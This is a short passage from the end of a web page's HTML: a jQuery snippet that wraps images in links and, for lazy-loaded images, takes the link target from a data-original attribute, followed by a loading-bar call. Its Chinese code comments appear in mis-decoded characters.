      /* å›¾ç‰‡é‡‡ç”¨æ‡’åŠ è½½å¤„ç†æ—¶,
       * ä¸€èˆ¬å›¾ç‰‡æ ‡ç­¾å†…ä¼šæœ‰ä¸ªå±æ€§åæ¥å­˜æ”¾å›¾ç‰‡çš„çœŸå®åœ°å€ï¼Œæ¯”å¦‚ data-original,
       * é‚£ä¹ˆæ­¤å¤„å°†åŸæœ¬çš„å±æ€§åsrcæ›¿æ¢ä¸ºå¯¹åº”å±æ€§ådata-original,
       * ä¿®æ”¹å¦‚ä¸‹
       */
       if (LAZY_LOAD_IMAGE) {
         $(element).attr("href", $(this).attr("data-original"));
       }
      $(this).wrap(element);
  });
</script>





  <script>setLoadingBarProgress(100);</script>
</body>
</html>
